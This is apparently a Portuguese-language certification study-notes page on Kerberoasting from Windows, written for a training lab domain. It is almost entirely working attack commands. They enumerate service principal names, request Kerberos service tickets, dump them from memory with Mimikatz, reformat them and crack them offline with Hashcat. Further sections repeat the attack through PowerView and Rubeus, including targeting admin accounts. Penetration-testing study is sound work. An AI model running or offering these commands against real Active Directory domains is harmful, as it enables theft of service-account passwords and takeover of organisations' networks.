> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/active-directory-enumeration-and-attacks/kerberoasting-from-windows.md).

# Kerberoasting - from Windows

* **Enumerando SPNs com setspn.exe**

```powershell
setspn.exe -Q */*
```

* **Visando um único usuário**

{% code lineNumbers="true" %}

```sh
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

{% endcode %}

* **Recuperando todos os tickets usando setspn.exe**

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

* **Extraindo Tickets da Memória com Mimikatz**

```powershell
mimikatz # base64 /out:true

mimikatz # kerberos::list /export 
```

* **Preparando o Blob Base64 para Cracking**

```powershell
cho "<base64 blob>" |  tr -d \\n 
```

* **Colocando a saída em um arquivo como .kirbi**

```powershell
cat encoded_file | base64 -d > sqldev.kirbi
```

* **Modificando crack\_file para Hashcat**

```powershell
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

* **Quebrando o Hash com Hashcat**

```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

**Rota automatizada/baseada em ferramentas**

* **Usando o PowerView para extrair tickets TGS**

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

* **Usando o PowerView para direcionar um usuário específico**

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

* **Exportando todos os tickets para um arquivo CSV**

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

* **Visualizando o conteúdo do arquivo .CSV**

```
cat .\ilfreight_tgs.csv
```

**Usando Rubeus**

* **Usando o sinalizador /stats**

```
.\Rubeus.exe kerberoast /stats
```

* **Usando o sinalizador /nowrap**

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

* **Quebrando o Ticket com Hashcat e rockyou.txt**

```
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

* **Verificando os tipos de criptografia suportados**

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

* **Solicitando um novo bilhete**

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

* **Executando Hashcat e verificando o status do trabalho de cracking**

```powershell
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```
